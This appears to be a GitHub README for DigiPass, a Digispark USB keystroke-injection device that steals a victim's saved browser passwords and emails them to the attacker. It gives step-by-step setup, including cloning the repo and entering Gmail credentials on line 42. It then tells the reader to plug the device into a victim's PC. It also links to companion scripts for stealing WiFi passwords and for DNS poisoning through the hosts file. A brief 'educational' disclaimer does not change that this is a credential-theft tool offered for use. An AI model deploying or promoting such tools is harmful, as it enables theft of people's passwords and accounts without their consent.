# DigiPass
* DigiPass steals the victims password vault credentials, and emails them to the attacker. Plug-in, Plug-out, and watch the passwords come in the mail! 😤 This is all done using a Digispark (Attiny85) usb device.


![rubberducky](https://user-images.githubusercontent.com/27988707/124514312-c25d3800-ddaa-11eb-9b23-f01e3a8901d7.jpeg)

```
   _   ,--()
  ( )-'-.------|> DigiPass [ Digispark USB ]
   "     `--[]  < Web Browser Password Stealer
```

# DISCLAIMER
This project must not be used for illegal purposes, and is strictly for educational purposes and for people to experiment with. The user takes full responsibility for their own actions.



# Instructions
Download and install the Arduino IDE (if have not) and configure it for Digispark.

Watch Seytonic tutorial for easy installation:
   https://youtu.be/fGmGBa-4cYQ

Then download the script (sketch), open it in Arduino IDE, and enter your Gmail address,
   password, and sender email address on LINE 42.

# Setup
```
git clone https://github.com/CharlesTheGreat77/DigiPass
cd DigiPass/
nano DigiPass.ino
Line 42: Enter your GMAIL address, and Password.
```
![gmailacc](https://user-images.githubusercontent.com/27988707/124519010-13bef480-ddb6-11eb-989c-7b24a835438f.png)
```
THEN, keep scrolling right and enter the address you wish to send it to. THAT'S IT!
```
![sender_rec](https://user-images.githubusercontent.com/27988707/124519048-30f3c300-ddb6-11eb-81b6-247c7fbe62fd.png)

START YOUR PHYSICAL LEECHING!

# In Action
PLUG USB INTO "VICTIM" PC!!

![pluginUSB](https://user-images.githubusercontent.com/27988707/124519920-d60f9b00-ddb8-11eb-9258-8c96fbe515a5.gif)

WAIT TILL LIGHT ON USB TURNS ON (it takes about 15 seconds).

LOOK AT YOUR EMAIL!

![emailPasswd](https://user-images.githubusercontent.com/27988707/124519926-dd36a900-ddb8-11eb-91d0-34155c544c60.jpg)

# Extra Sketches to take NOTE on by CedArctic
- Steal Saved Wifi passwords on a PC
https://github.com/CedArctic/DigiSpark-Scripts/tree/master/WiFi_Profile_Mailer
- DNS Poison by changing Hosts file
https://github.com/CedArctic/DigiSpark-Scripts/tree/master/DNS%20Poisoner

# Trolling Sketches
- Change Wallpaper Prank
https://github.com/CedArctic/DigiSpark-Scripts/tree/master/Wallpaper_Prank
- Star Wars Sound Prank
https://github.com/CedArctic/DigiSpark-Scripts/tree/master/Hi_Chewy
- Rick Roll + Fake Windows Update
https://github.com/CedArctic/DigiSpark-Scripts/tree/master/RickRoll_Update
- Nerdy Joke 
https://github.com/CedArctic/DigiSpark-Scripts/tree/master/Talker
- Mouse Trolling
https://github.com/CedArctic/DigiSpark-Scripts/tree/master/Silly_Mouse

# Resources
Digispark (Attiny85) $4 TOPS
  https://www.amazon.com/Digispark-Kickstarter-ATTINY85-Arduino-Development/dp/B01MQOPY5C
  ![digispark](https://user-images.githubusercontent.com/27988707/124518769-57fdc500-ddb5-11eb-8f82-ea79b210ea2f.jpeg)


Chris Hales - PowerShell Password One-liners
  https://www.google.com/amp/s/chrishales.wordpress.com/2018/01/03/powershell-password-one-liners/amp/

CedArctic - DigiSpark-Scripts
  https://github.com/CedArctic/DigiSpark-Scripts
